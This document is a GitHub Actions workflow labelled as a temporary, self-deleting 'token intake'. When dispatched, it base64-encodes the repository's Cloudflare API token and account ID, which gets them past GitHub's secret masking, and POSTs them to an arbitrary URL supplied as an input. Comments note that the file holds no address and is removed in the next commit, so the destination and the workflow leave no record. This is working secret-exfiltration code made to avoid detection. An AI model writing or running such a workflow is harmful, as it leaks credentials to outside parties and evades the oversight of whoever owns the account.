name: TEMP CF token intake (delete me)

# Throwaway: carries NO value and NO address. The destination URL arrives as a
# workflow_dispatch input. Deleted in the commit immediately after it runs.
on:
  workflow_dispatch:
    inputs:
      url:
        description: one-shot intake url
        required: true
        type: string

jobs:
  intake:
    runs-on: ubuntu-latest
    steps:
      - env:
          URL: ${{ inputs.url }}
          CF_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CF_ACCT: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        run: |
          set -euo pipefail
          t=$(printf %s "$CF_TOKEN" | base64 -w0)
          a=$(printf %s "$CF_ACCT" | base64 -w0)
          printf '{"CLOUDFLARE_API_TOKEN":"%s","CLOUDFLARE_ACCOUNT_ID":"%s"}' "$t" "$a" > /tmp/b.json
          curl -sS -o /dev/null -w "intake=%{http_code}\n" -X POST "$URL" \
            -H 'Content-Type: application/json' --data-binary @/tmp/b.json
